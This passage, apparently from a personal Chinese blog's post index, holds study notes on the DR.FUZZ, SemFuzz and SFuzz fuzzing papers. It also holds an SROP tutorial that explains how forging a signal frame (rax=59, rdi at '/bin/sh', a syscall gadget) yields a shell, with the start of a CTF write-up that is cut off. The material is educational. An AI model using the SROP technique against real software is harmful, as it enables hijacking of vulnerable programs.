的所有输入/输出转发到适配器，fuzzer 将突变数据作为设备输入注入，并通过这个适配器中断到设备驱动程序 修改的 KVM 模块 修改后的 KVM 模块捕获并解析执行新的 VMCALL 指令导致的虚拟机退出。这些 VMCALL 指令由语义分析工具插入到驱动程序中 (1a)。当驱动程序执行触发这些 VMCALL 指令时，vm 退出发生，该模块从 vm 退出传递的寄存器 RCX 中提取一个参数。该参数表示出口 (4) 的位置。最后，KVM 模型将 KVM 出口信息发送给 fuzzer，引导其突变 (5)。\n用户模式代理 代理是运行在虚拟机用户空间中的程序。当驱动程序初始化时，控制流被转移到这个程序。它自动执行预定义的系统调用来触发驱动程序函数的执行。\n4 SEMANTIC-INFORMED MECHANISM A 语义分析 字节级和字段敏感值推断 : 识别依赖于 I/ o 的字段并构建图形 采用对驱动程序中数据结构的所有字段使用后向字段敏感的数据流分析来识别依赖于 I/O 的字段 反向分析的目标是找到一个字段的源，如果源是设备输入，即 I/O 指令的目的操作数，我们就确认相应的字段依赖于 I/O。 根据数据流得到一个依赖于 I/ o 的图 (如图 5 的左侧所示)。它的节点表示一个字段变量，边表示两个变量之间的数据流。 识别验证链、关键字段及其值 目的：识别验证链会使用到的字段，并且收集预期的有效值 方法：作者认为验证链具有特定的模式——是否为条件语句，是否具有分支。（图五右侧）得到关键字段后，作者将验证视为字段约束，使用静态的过程间和字段敏感的数据流分析来收集字段的约束。 换言之，基于上面构建的 I/O 依赖图，分析并收集图中关键字段相关的分支条件，得到可能的有效值。 I/O 地址-字段映射 处理硬编码映射。 目的：上面的步骤只是知道了关键字段和关键字段对应的可能值，那么 fuzzer 如何将值填到相应字段呢，就要找对应 I/O 地址。 方法：同样利用 I/O 依赖图来找到字段的来源——填充该字段的 I/O 指令，此指令的源操作数是该字段对应的 I/O 地址。 处理动态映射 除了具有硬编码 I/O 地址的字段外，还有一些字段的对应 I/O 地址是动态生成的。在这种情况下，仅靠静态分析无法计算出 I/O 地址。为了解决这一问题，我们提出了一种动态地址映射技术。基本思想是，如果 DR. FUZZ 没有在正确的 I/O 地址准备正确的值，则必须有一个错误状态 (即失败)，该状态将作为反馈收集在 DR. FUZZ 中。我们将错误状态信息设计为包含一个将反馈给模糊器的特殊参数。该参数包括导致初始化失败的关键字段信息。为此，我们首先对关键字段进行编号，然后在路径状态反馈期间使用代码插装将数字写入相关寄存器，以完成参数传输。关于错误状态反馈的更多细节将在§IV-B1 中介绍。\n字节优先推断 上面的技术虽然也减小了输入空间，但是，首先，它的结果可能不精确，所以模糊器仍然需要测试它们。第二，由于缺乏语义信息，部分输入无法推断。\n验证链的时序模式 验证链遵循特定的时间模式。\n首先，从读取设备开始执行代码。读取从 I/O 地址 (AddrV) 获得一个值 (V)。 其次，值 (V) 将被用作源操作数和位掩码，用于位操作，以生成新的中间值 (I = V \u0026amp;bitmask)。 第三，这个值 (I) 将在使用值 (V) 之前进行验证。 第四，使用值。在这种执行模式中，值 (V) 被读入一次，但随后会被引用。 提取时序 为了提取字节优先级语义，我们需要将字段与时态模式匹配。 我们检查 I/O 依赖图中的节点，并针对节点识别相关操作，包括位掩码、验证和使用情况，得到使用字段的时间顺序。 然后重用§IV-A2 中构造的 I/O 地址字段映射，最终恢复输入中字节的优先级\nB 语义 informing B.1路径状态作为模糊反馈 我们将状态分为两种类型，正常状态或错误状态。正常状态是指初始化代码路径仍然可以被输入触发，而错误状态是指驱动程序已经进入故障状态，如果 fuzzer 沿着方向继续，初始化将无法进行。\n错误位置 错误状态反馈可以为模糊器提供以下有用的信息。\nfuzzer 可以尽快知道驱动初始化失败了 fuzzer 可以更准确地知道是哪个输入导致了初始化失败，这可以使 fuzzer 在选择下一个输入时更有效。 作者指出当驱动程序执行失败的时候，上游收到的返回值是非零值，所以使用驱动程序函数的非零返回值作为标志来指示驱动程序的错误状态。 收集错误状态 首先收集驱动函数返回错误的位置，在这些位置插入一小段 vmcall 代码 驱动发生错误后，这段代码让系统退出，DR. FUZZ 通知 fuzzer，传递包含有用信息的参数给状态分析器 此参数可以指示输入是否满足期望值，状态分析器使用此参数提示字节优先级突变，以便为下一个输入改进突变。 B.2 新变异策略 代码覆盖率引导和错误状态引导两种策略交替使用，在驱动初始化的阶段使用错误状态引导，当在错误状态反馈下没有进展后，转移到代码覆盖引导。\n实施 基于 LLVM 实现语义分析和插桩，基于 syzkaller 实现语义通知机制。\n设备适配器\n我们在 QEMU 中将适配器作为一个模块来实现。适配器向 QEMU 的 VM 出口处理程序注册一些 I/O 处理程序; 这些处理程序解析由于访问适配器的 IO 端口/MMIO/DMA 地址而导致的退出事件。来自客户操作系统内核的每个读/写操作都被分派到适配器提供的注册函数。同时，适配器创建多个 memoryregion 用于将 fuzzer 输出传递到目标 I/O 地址。适配器通过文件套接字读取模糊生成的数据，并将值写入 MemoryRegions。 用户模式代理\n它的实现是特定于设备的; 即根据具体设备的功能提供相应的模糊逻辑。因此，其模糊逻辑应由驱动测试人员提供。代理的实现可以确定它是否可以触发驱动程序提供的一些功能。由于代理的具体实现不是我们的重点，因此我们重用 syzkaller 的 syscall 生成器来自动生成用户模式代理。 语义分析\n首先配置内核以启用设备驱动程序 生成驱动程序代码的 IR 文件。这些 IR 文件将通过 LLVM pass 进行分析。 LLVM pass 将语义信息输出到语料库文件。fuzzer 根据这个文件生成适当的值作为设备输出。 虚拟机快照\n在模糊化过程中，我们使用了两个虚拟机快照。第一个是在设备初始化阶段。为了提高吞吐量，我们跳过了一些与内核相关的初始化代码。我们在实际的总线扫描开始时创建一个快照。当 fuzzer 收到错误反馈时，我们从快照重新开始执行。 第二个快照是在设备驱动程序初始化之后; 也就是说，在相关探测函数成功执行之后，我们将创建用户模式代理的实际点的快照，这样用户空间程序就可以更快地执行，而无需重新执行内核。 评价 A 驱动初始化的效率 DRFUZZ 可以成功 match 所有的驱动程序，初始化成功 70%的程序。 I2C 总线的驱动程序初始化成功率较高，因为协议比较简单，对于其他协议作者指出再给 3 个小时（实验设定 24 个小时）可以再成功初始化 6 个 从上图中可以看出，值推断只能完成部分驱动程序的初始化。虽然值推断在匹配中是有效的，但它在完成整个初始化时是无效的——仅值推断不能成功地初始化。在字节优先级技术的帮助下，匹配了更多的设备驱动程序。然而，如果没有状态反馈的帮助，仅靠字节优先级很难产生很好的结果，只有在同时启用这三者时才能产生最好的结果。\n目的： 方法： 意义： 效果：\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/semantic-informed-driver-fuzzing-without-both-the-hardware-devices-and-the-emulators/","summary":"中文译名：不需要硬件设备和模拟器的语义驱动模糊 作者：Wenjia Zhao 单位：西安交通大学 国家： #中国 年份： #2022年 来源： #NDSS会议 关键字","title":"Semantic-Informed Driver Fuzzing Without Both the Hardware Devices and the Emulators"},{"content":"中文译名：SemFuzz:基于语义的概念验证漏洞自动生成 作者：wei you btw 二作和三作是 IIE，三作是陈凯 单位：印第安纳大学伯明顿分校 国家： #美国 年份： #2017年 来源： #ccs\n关键字： #fuzzing #定向fuzzing #generate_poc 代码地址： 笔记建立时间： 2023-04-10 09:47\n摘要 提出 semfuzz，利用漏洞相关文本（例如，CVE 报告和 Linux git 日志）来指导 PoC 的自动生成 基于 NLP 来进行信息提取 基于语义的模糊处理来生成 PoC SemFuzz 运行了过去五年报告的112个 Linux 内核缺陷，成功触发了其中的18个，并进一步发现了一个零日漏洞和一个未公开的漏洞。 怎么感觉成功触发的有点少啊\nInstruction 漏洞的 CVE 报告，Linux git 日志、论坛和博客上发布的错误描述都可以用来帮助自动生成 PoC\n从攻击方角度来说如何去利用这些信息 从防守方角度来说，如何控制这些信息的泄露 自动生成 exploit 的挑战 自动生成 exp 很困难，目前能够实现的都是针对一些简单的输入验证类的漏洞。其他类型的漏洞 (如不受控制的资源消耗、死锁、内存损坏等)的 exp 自动生成过于复杂，目前（2017 年前）还没人做。 目前的方法主要就是符号执行找到约束，求解约束 但是就算是简单的输入验证类漏洞，符号执行和约束求解也是困难的。因为现实世界的程序的漏洞的路径约束往往是非线性的，增大了求解难度 本文方法 利用与漏洞相关的非代码文本，特别是 CVE 报告和 Linux git 日志，来提取指南，这些指南被认为是有助于发现和触发一组深层错误的信息。 本文的技术是基于语义的模糊测试，自动分析错误报告，以在 Linux 内核漏洞上创建端到端的 PoC 首先利用 NLP 来分析 CVE 和 git 日志，利用这些信息来创建一个到达漏洞函数的调用序列 利用模糊测试迭代的调整各个调用的参数，以移动到函数内部的修补代码，直到触发漏洞。（我的理解就是被测程序实际上是没有这个修补代码的，已修补的程序修补代码的位置就是未修补程序漏洞的位置） SemFuzz 能够处理内核代码中的各种漏洞 DESIGN OVERVIEW SemFUZZ 主要是两个步骤：\n语义信息提取 基于语义的 fuzzing 上图是个示例，左上方是 CVE 描述，左下方是漏洞的 git 日志。semfuzz 首先启动内核准备 fuzz 环境，使用从描述中发现的概念 (即“MSG MORE”，“loopback”，“UDP”)构建种子输入——就是右上的 system call。在 fuzzing 过程中根据从补丁中提取到的信息（cfg）和监控关键变量的反馈对输入进行变异，直到触发漏洞。 说明。 语义信息的提取 基于正则表达式的字符串匹配等语法手段直接提取信息的效果不好，没有考虑单词之间互相的依赖性，没有考虑语句的语义。 采用 NLP、词性标记 POS、短语解析和句法解析，SemFuzz 构建了一个解析树来识别每个单词的 POS 标记，并识别句子中的句法子句以进行语义分析。 生成解析树 使用 NLP 工具 pyStatParser 从 Penn 树库学习概率上下文无关语法，并为 CVE 和 git 日志中的每个句子生成解析树。上图右下角展示的就是\u0026quot;the whole skb len is dangerous\u0026quot;的语法树，每个叶子的父节点是单词对应的 POS 标记。\n提取受影响的版本 先利用正则表达式在 CVE 和 git 日志中识别版本号，然后在解析树中定位包含版本号的句子。定位句子主要是为了过滤信息，因为 SemFuzz 是对 Linux 内核的 fuzz，所以只找 Linux 的版本号，过滤其他应用程序的版本号。\n提取漏洞类型 作者根据 CWE 为 SemFuzz 设置了 16 种漏洞候选类型，SemFuzz 在解析树中的 NP（名词短语）节点中寻找候选类型，如果没有找 到，就用 CVE 编号作为关键字去 NVD 中搜索 Technical Details 字段得到漏洞类型。\n提取漏洞函数 SemFuzz 将未修补的 Linux 内核版本与修补过的 Linux 内核版本 (在 git 日志中表示)进行比较，并将修改过的函数定位为候选脆弱函数。 通过以下观察进一步定位真实的漏洞: (1)如果在 CVE 描述中还提到了一个修补过的函数，则该函数更有可能是漏洞函数;(2)如果 CVE 描述或补丁描述中提到的某个变量，则更有可能与该脆弱功能有关。 SemFuzz 首先在解析树中搜索修补函数的名称，并将发现的函数视为脆弱函数。如果没有发现，SemFuzz 将解析树中的名词与补丁函数中的变量进行比较。\n提取关键变量 关键变量需要满足两个条件\n出现在未被修补的脆弱函数中 在 CVE 或 git 日志中有所提及 SemFuzz 首先从未修补的脆弱函数中提取所有变量，构建一个包含变量和其类型信息的符号表。然后 SemFuzz 检查符号表中的任何变量是否存在在解析树的名词或形容词结点。\n提取系统调用 因为 CVE 和 git 日志中可能不会显式的提到可以触发漏洞的系统调用，所以作者建立了一个知识库 (系统调用及其参数之间的关系)，用于将 CVE 或 git 日志描述中的关键字与特定领域的概念关联起来。 作者基于 Linux 程序员手册 LPM 来构建知识库：\nLPM 的系统调用的 SYNOPSIS 字段进行了声明，若参数中有枚举类型，则 DESCRIPTION 字段列举了类型为枚举的参数的所有值，将这些枚举值与系统调用相关联。 系统调用的 see also 字段包含了其他相关信息，在 SEE ALSO 字段的其他 LPM 页面中也会存在相关的系统调用，识别 synopsis 字段的示例代码和 description 字段中的关键结构的特殊值，并将其与 LMP 名称关联 当一个系统调用的参数名等于另一个系统调用的返回变量名时，SemFuzz 桥接两个系统调用之间的关联。 在以这种方式分析了所有页面之后，SemFuzz 能够在使用 POS 标签 NN (即名词)在解析树的叶中识别关键字时检索系统调用及其参数。 使用这种方法，SemFuzz 自动分析1082个 LPM 页面，并将373个系统调用与2000多个关键字关联起来，这比仅使用系统调用名作为关键字的次数要多。从我们对112个 cve 的评估中，SemFuzz 可以成功检索其中96个 (86%)的系统调用，以进行进一步的模糊处理。\n语义引导的模糊测试 SemFuzz 从 CVE 和 Linux git 日志中的非代码文本中提取必要的信息或指南，以指导模糊处理过程。特别是，检索到的“受影响版本”帮助 SemFuzz 设置正确的测试环境。然后 SemFuzz 使用检索到的“系统调用”生成第一个输入 (即种子输入)。在模糊处理过程中，SemFuzz 对输入执行粗突变，以找到可以将执行移向“脆弱函数”的系统调用序列。在此之后，SemFuzz 通过监视“关键变量”继续对系统调用序列执行细粒度突变，直到根据“漏洞类型”指定的攻击结果的标志发现目标漏洞被触发。\n设置测试环境 加载一个易受攻击的 Linux 内核并进行一系列系统调用 在虚拟机内部构建 Linux 内核，并让 SemFuzz 从外部 (即在主机上)加载它 预先构建了103个 Linux 内核版本，以避免冗余构建以节省时间 当从 CVE 中检索到版本号时，SEMFUzz 的 out-box 加载器加载对应版本，然后 in-box 向内核发送一系列系统调用 观察内核的执行状态，包括执行的函数、关键变量的值和内核的异常事件 为了监控执行的函数，利用 KCOV（内核代码覆盖）来跟踪内核中执行的代码 为了跟踪关键变量，作者去观察内核函数的参数，而不是关键变量 原因 在源代码中对关键变量插桩不灵活，每次观察不同的变量都要重新编译 动态检测，在运行时定位关键变量，但是这样的变量可能会在编译的时候被优化掉 操作 对关键变量执行向后的过程内数据流和控制流做静态分析，找到关键变量依赖的参数 为了捕获内核的异常时间，semfuzz 在虚拟机之外监视内核 实现 基于最先进的 Linux 系统调用 fuzzer Syzkaller 构建 SemFuzz。对于 in-box observer, Syzkaller 可以直接调用 KCOV 的 API，获取内核的执行状态。除此之外，Syzkaller 可以通过随机添加、删除或改变系统调用及其序列中的参数来执行模糊。至于 out-box observer，Syzkaller 监视内核是否崩溃或挂起，还检查内部内核错误检测器的输出 (例如，KASAN 用于检测内存错误，UBSAN 用于检测未处理的行为，如整数超过 (ow))。\n生成种子输入 种子输入是通过以下两个步骤构建的。\n所有检索到的系统调用 (以及检索到的参数值)被放在一起作为不完整的种子输入。 如果参数是一个结构，则填充结构中的每个字段。对于枚举字段，用从 LPM 学到的相关枚举值填充。对于其他字段，使用与其类型兼容的随机值填充。 其次，SemFuzz 将其他系统调用与检索到的系统调用关联起来，并将它们放入种子输入中。如第4节所述。 为什么要这么做的，因为一个系统调用可能无法正确执行，比如漏洞函数相关的系统调用是 send，但是光有 send 不行，send 之前还得有 bind，所以输入的种子得是一个系统调用序列 作者进一步将这种相关性扩展到共享相同类型的系统资源 (例如，文件，套接字)的系统调用。通过这种方式，所有相关的系统调用都放在种子输入中。虽然这可能会带来一些无用的系统调用来触发漏洞，但它增加了命中脆弱函数的概率。 粗粒度变异 这一步的目标是生成一个可以让执行到达易受攻击函数的输入 把每次使用输入的运行都称为一个模糊实例。然后，对于每个实例，我们通过 in-box observer 观察 Linux 内核的执行情况，并测量脆弱函数与模糊实例的执行轨迹之间的距离。选择与最短距离对应的输入作为新的种子输入进行下一轮模糊，直到达到任何脆弱函数。\n将两个节点 dist (n1, n2)的距离定义为 n1到 n2之间最短路径上的节点数 基于距离，作者给出了优先级的计算公式 那么系统调用序列 s （输入）的优先级公式为： KCOV (s)是输入 s 在模糊实例中执行的函数集 RCG (f)为 f 的反向调用图中的函数集 那么公式的意思就是输入 s 的优先集是 s 在模糊实例中执行的函数优先级的最大值 细粒度变异 在找到允许内核运行易受攻击函数的输入 I 之后， SemFuzz 通过监视关键变量的反馈来进行细粒度的变异。 细粒度的变异不会添加或删除输入中的系统调用，而是去修改参数值。 在找到允许内核运行易受攻击函数的输入 I 之后，SemFuzz 继续使用来自监视“关键变量”的反馈来更改输入。 使用基本块之间的距离来测量输入质量，从 b1到 b2的最短路径上的基本块的数量来测量两个基本块 (b1和 b2)之间的距离，记为 distB (b1, b2)。 则输入的优先级由以下两个公式确定： KCOVB (s)为系统调用序列 s 中覆盖的基本块的集合 函数 f 的修补代码在基本块集合 PATCH = {p1, p2，…， pn} e 是 entry 评估 效率 exp 生成的有效性 此处作者分析了 semfuzz 为什么没有给出其余 94 例 cve 的原因：\n某些漏洞只有在输入 (特别是系统调用的参数)满足特定条件时才会触发，这是 SemFuzz 在有限的时间内难以生成的。 某些漏洞只有在出现竞态条件时才有可能出现。由于并发执行的不确定性，SemFuzz 仍然需要更多的时间来触发这些条件。 通过选择性符号执行和操纵线程调度来增强模糊的研究有助于进一步提高 SemFuzz 的性能。 信息取的有效性 精度高\n性能 性能好\nfind 这里作者分析了一下 cve 和 git 日志中的内容对生成 exp 的影响。这部分我感觉很好，详实了论文内容，属于是锦上添花。\n讨论 不能触发设备引起的漏洞，不能触发逻辑漏洞 可以将基于语义的 fuzz 推广到其他 fuzz 对象 除了 cve 和 git 日志还可以增加更多的信息来源 目的： 方法： 意义： 效果：\n可以对 semfuzz 进行拓展，它只支持 Linux 内核 semfuzz 的内容提取部分比较简单，不够复杂 提取的时候哪里用到 NLP 了？ 提取系统调用那里也有点简单？ 生成种子的时候系统调用序列的顺序没有很好的去处理，并且有点冗余，影响性能了 粗粒度变异那里是如何衡量距离的 后向可达性分析了解一下 Effective of exploit generation 中分析的 poc 没有生成的原因是下一步研究的方向\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/semfuzz-semantics-based-automatic-generation-of-proof-of-concept-exploits/","summary":"中文译名：SemFuzz:基于语义的概念验证漏洞自动生成 作者：wei you btw 二作和三作是 IIE，三作是陈凯 单位：印第安纳大学伯明顿分校 国家： #美","title":"SemFuzz Semantics-based Automatic Generation of Proof-of-Concept Exploits"},{"content":" information source common vulnerabilities and exposures (CVE) systems CVE - CVE (mitre.org) Linux git logs CVE - CVE (mitre.org) bug descriptions posted on forums and blogs SEMANTIC INFORMATION RETRIEVING NLP tool process these information, output calling sequence. so, fuzzer utilizes the sequences to guidline the fuzz this part i want know how the fuzzer use these sequences, how two prune the unreachable path I noticed that the example both have cve report and git log Generating parse tree: the tool is pyStatParser，author use it to generate the syntax tree Retrieving affected version: basically, match through regular expressions Retrieving vulnerability type: from the 70 types of Linux kernel related CWEs, author choosed 16 types as the default type of semfuzz and semfuzz identified through the parse tree. If there it no vulnerability in the parse tree, semfuzz check out in the NVD. why choose the 16 kinds of types How can semfuzz check out vulnerability type in NVD, artificial or automatic? Retrieving vulnerable functions：by compare the patched program and the unpatched program firstly, semfuzz search the patched function name in the parse tree if can not find, secondly, search the patched function\u0026rsquo;s variables in the parse tree Retrieving critical variables: follow two rules: a. variable appears in a unpatched vulnerable function; b. variable also mentioned in the description of information firstly, semfuzz retrieve all variables in the unpatched functions and build a symbol table. then, searche the parse tree note that a variable must be a noun or an adjective in a phrase Retrieving system calls: author build a system calls database for reveal the relationship between variables and systemcalls and search the system call in the database useing the variables semfuzz based on the kernel fuzzer Syzkaller Generating Seed Input: use the retrieved system calls as a imcomplete seed and crrelates other relative systemcalls as the complete seed Coarse-level Mutation: change the system calls sequences, compare the execution trace of fuzzing instance and target, calculate the distance Fine-grained Mutation: change the parameter and compare the basic block number what can i improve the methd to generate syntax tree or we don\u0026rsquo;t use syntax tree before generate syntax tree, we can delete the irrelevant infromation firstly semfuzz need both git logs and cve report maye can use less information the method of retrieving vulnerable functions maybe can improve if i extend this approach to other software, maybe don\u0026rsquo;t need retrieve system calls the method of retrieving information too simple and rough and lack of semantics although it called semfuzz the improve about the fuzz method is almost nothing, just use the result of retrive information as the fuzz seed ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/3.%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/semfuzz-%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/","summary":"information source common vulnerabilities and exposures (CVE) systems CVE - CVE (mitre.org) Linux git logs CVE - CVE (mitre.org) bug descriptions posted on forums and blogs SEMANTIC INFORMATION RETRIEVING NLP tool process these information, output calling sequence. so, fuzzer utilizes the sequences to guidline the fuzz this part i want know how the fuzzer use these sequences, how two prune the unreachable path I noticed that the example both have","title":"SemFuzz 总结笔记"},{"content":"基于SFuzz切片的实时操作系统模糊\nAbstract 背景：嵌入式系统大多是实时操作系统。\n问题：RTOS的单体设计将各种任务和服务结合成一个单一的二进制文件，这阻碍了目前在RTOS系统上的程序测试和分析技术。\n目的：提出了SFuzz，一种新型的基于切片的模糊器，用于检测RTOS系统的安全漏洞。作者认为RTOS通常将一个复杂的二进制文件划分为许多分离但一心一意的任务。每个任务以确定的方式完成一个特定的事件，其控制流通常是直接和独立的。因此，作者从单一的RTOS二进制文件中识别出这样的代码，并合成一个切片进行有效的测试。\n方法：SFuzz首先识别处理用户输入的函数，构建从这些函数的调用者开始的调用图，并利用前向切片来构建基于调用图的执行树，并修剪独立于外部输入的路径。然后，它检测粗粒度范围内阻碍有效模糊处理的路障，如与用户输入无关的指令。然后，它在这些代码片段上进行覆盖率引导的模糊处理。最后，SFuzz利用前向和后向切片来跟踪和验证每个路径约束，并确定在模糊器中发现的错误是否是真正的漏洞。\n理解：貌似作者首先从用户输入的函数开始构建调用图，然后基于调用图利用前向切片构建执行树，\nINTRODUCTION 传统静态分析的挑战：单体RTOS二进制的大尺寸（路径爆炸）、难识别函数语义、无正确和稳定的仿真环境\n现状：要么只在特定的设备上工作，要么依赖真实的设备，要么检测有限的错误类型，要么需要人工分析和领域知识，总的来说，在RTOS中缺乏一种灵活和通用的方法来有效地发现漏洞。\n方法：因为RTOS通常将一个应用划分为许多分离的子任务，每个子任务的控制流都是独立的，它们的数据流或许会有类似的模式。所以首先寻找相同的数据流，然后定位对应函数，然后切片代码，对得到的切片代码进行模糊测试。“这些切片足够小，可以使用现有的模糊逻辑进行测试。此外，它们提出了更小但更关键的控制流范围。它可以大大缓解仿真难度和分析复杂性，这将使我们能够进行更有效和高效的测试，如灰盒模糊和符号执行。”\nSFuzz：四个主要部分\n正向切片机：定义启发式方法来定位函数，然后构造调用图，在调用图中进行前向切片。 控制流节点处理程序：使用控制流节点处理程序来给模糊器补充运行状态和运行上下文，指导模糊器确定如何处理与用户输入无关的函数调用和条件分支，这可以帮助模糊引擎提高路径探索的效率和稳定性。 微观模糊处理：我们的模糊引擎专注于修剪后的执行树中的指令。从输入源开始，它通过指令级仿真更新执行环境。该引擎将执行与输入相关的代码片段，并忽略大量不必要的路径，包括其他输入处理程序。为了检查危险的行为，它监测汇合点函数调用的上下文，并在上下文违反预定的安全策略时报告潜在的错误。 符号执行分析：对函数进行后向切片，然后从切片末尾进行符号执行，目的是补充上面修建而遗失的信息，最后实现一个完整而准确的路径条件来评估一个漏洞，从而过滤由于探索修剪和上下文缺失造成的假阳性结果。 PROBLEM AND APPROACH OVERVIEW RTOS and Embedded Devices 具有所有功能的单二进制 剥离了符号系统以减小文件大小 Motivation Example 举了个例子说明RTOS难分析\nNecessity and Reasonability of SFuzz 切片操作的优势：可以忽略模拟各种硬件和服务功能的困难，缓解符号执行的缓解路径爆炸问题 使用实例验证切片操作的正确性 Challenges of Slice-based Fuzzing 如何确定片段的范围？ 如何处理片段中与控制流有关的点？ 如何有效地进行基于切片的模糊处理和验证PoC？ DESIGN 前向切片机将调用图分析与前向污点分析相结合，以确定基于切片的模糊处理的每个任务的探索空间；控制流节点处理程序用于帮助后续的模糊处理部分跳过不必要的路径探索，这些节点会使模糊处理阶段卡住；微模糊引擎是一个混合灰盒模糊器，它结合了一些低级技术，如错误检测策略，使模糊器能够顺利运行并发现错误,Concolic分析器主要是为了帮助我们过滤由于探索修剪和上下文缺失造成的假阳性结果。\nForward Slicer 步骤概述：首先恢复固件中关键功能的语义，以定位外部数据入口点，然后利用前向切片模块输出与处理外部输入和全局数据有关的执行树。\n三部分：\n敏感调用图构造器 目的：检测输入获取函数和全局数据读取点，作为根节点 方法：没说 调用图修剪 目的：进一步修剪独立于外部输入的子图或路径 方法：利用轻量级(粗粒度)污染分析技术来跟踪调用图中的每个路径，确定外部输入和全局数据的影响范围，范围外的路径被修剪 调用图形拼接： 目的：在不同调用图的节点之间拼接一些边 方法：静态动态分析来识别相关节点，还有基于常量字符串进行搜索和匹配相关节点来拼接。 Control Flow Nodes Handler 控制流节点处理程序可以基于调用图构建目标代码段的执行树。但是为了使执行树上的模糊测试工作顺利进行，避免不必要的路径探索，需要处理与控制流相关的几种指令，换句话说需要策略来指导模糊器确定如何处理代码片段中的函数调用，并选择要跳转的条件语句的哪个分支。\nMicro Fuzzing 作为模糊引擎的核心，我们将基于切片的模糊技术称为微模糊。它接受代码片段作为输入，探索执行树中的路径，并忽略不相关的调用站点和其他输入数据处理程序。引擎同时检查接收器函数调用站点的上下文，并在根据预定义的策略进行内存访问时导出崩溃输入。\n镜像加载器：对切片代码进行预处理，插入跳转和结束指令，用于忽略不相关的调用站点和其他输入数据处理程序。 fuzz引擎：基于UnicornAFL，当调用核心引擎时，它加载RTOS系统，并从它的开始(执行树的根节点)重复执行目标代码片段。该引擎将在输入入口点生成随机数据。当核心模糊引擎卡住时，利用符号执行组件来引导模糊器沿着未探索的路径测试。 内存安全策略。这块没懂 Concolic Analyzer 目的是检测上面模糊测试得到漏洞是不是真的漏洞，因为修剪操作可能会产生假阳性漏洞。\n疑问 修建执行路径会不会导致覆盖率的降低 ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/sfuzz-slice-based-fuzzing-for-real-time-operating-systems/","summary":"基于SFuzz切片的实时操作系统模糊 Abstract 背景：嵌入式系统大多是实时操作系统。 问题：RTOS的单体设计将各种任务和服务结合成一个单一的二进制文件","title":"SFuzz Slice-based Fuzzing for Real-Time Operating Systems"},{"content":"SROP srop 的全称是 Sigreturn Oriented Programming。所以我们首先需要了解一下 Linux 的信号机制\nsignal 机制 如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。\n一个 signal frame 被添加到栈，这个 frame 中包含了当前寄存器的值和一些 signal 信息。 一个新的返回地址被添加到栈顶，这个返回地址指向 sigreturn 系统调用。 signal handler 被调用，signal handler 的行为取决于收到什么 signal。 signal handler 执行完之后，如果程序没有终止，则返回地址用于执行 sigreturn 系统调用。 sigreturn 利用 signal frame 恢复所有寄存器以回到之前的状态。 最后，程序执行继续。 64 位的 signal frame 如下图所示，signal frame 由 ucontext_t 结构体实现。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 // defined in /usr/include/sys/ucontext.h /* Userlevel context. */ typedef struct ucontext_t { unsigned long int uc_flags; struct ucontext_t *uc_link; stack_t uc_stack; // the stack used by this context mcontext_t uc_mcontext; // the saved context sigset_t uc_sigmask; struct _libc_fpstate __fpregs_mem; } ucontext_t; // defined in /usr/include/bits/types/stack_t.h /* Structure describing a signal stack. */ typedef struct { void *ss_sp; size_t ss_size; int ss_flags; } stack_t; // difined in /usr/include/bits/sigcontext.h struct sigcontext { __uint64_t r8; __uint64_t r9; __uint64_t r10; __uint64_t r11; __uint64_t r12; __uint64_t r13; __uint64_t r14; __uint64_t r15; __uint64_t rdi; __uint64_t rsi; __uint64_t rbp; __uint64_t rbx; __uint64_t rdx; __uint64_t rax; __uint64_t rcx; __uint64_t rsp; __uint64_t rip; __uint64_t eflags; unsigned short cs; unsigned short gs; unsigned short fs; unsigned short __pad0; __uint64_t err; __uint64_t trapno; __uint64_t oldmask; __uint64_t cr2; __extension__ union { struct _fpstate * fpstate; __uint64_t __fpstate_word; }; __uint64_t __reserved1 [8]; }; 在栈中的分布如下 SROP 利用原理 在执行 sigreturn 系统调用的时候，不会对 signal 做检查，它不知道当前的这个 frame 是不是之前保存的那个 frame。由于 sigreturn 会从用户栈上恢复恢复所有寄存器的值，而用户栈是保存在用户进程的地址空间中的，是用户进程可读写的。如果攻击者可以控制了栈，也就控制了所有寄存器的值，而这一切只需要一个 gadget：syscall; ret;。 通过设置 eax/rax 寄存器，可以利用 syscall 指令执行任意的系统调用，然后我们可以将 sigreturn 和其他的系统调用串起来，形成一个链，从而达到任意代码执行的目的。下面是一个伪造 frame 的例子： rax=59 是 execve 的系统调用号，参数 rdi 设置为字符串“/bin/sh”的地址，rip 指向系统调用 syscall，最后，将 rt_sigreturn 设置为 sigreturn 系统调用的地址。当 sigreturn 返回后，就会从这个伪造的 frame 中恢复寄存器，从而拿到 shell。 对于这个寄存器的选择，因为系统调用号必须存入 rax 中，其他的寄存器选择就需要按照 Linux 下的函数调用约定来进行。\npwnlib. rop. srop 在 pwntools 中已经集成了 SROP 的利用工具，即 pwnlib.rop.srop，直接使用类 SigreturnFrame，我们可以看到针对不同的架构 SigreturnFrame 构造了不同的 uncontext_t BackdoorCTF 2017 Fun Signals 查看文件，可以看到这是一个 64 位的程序，并且没有开任何防护措施 拖入 IDA 中查看，可以看到程序中进行了两次 syscall，第一次 rax 的值是 0，调用 read 函数，第二次 rax 值是 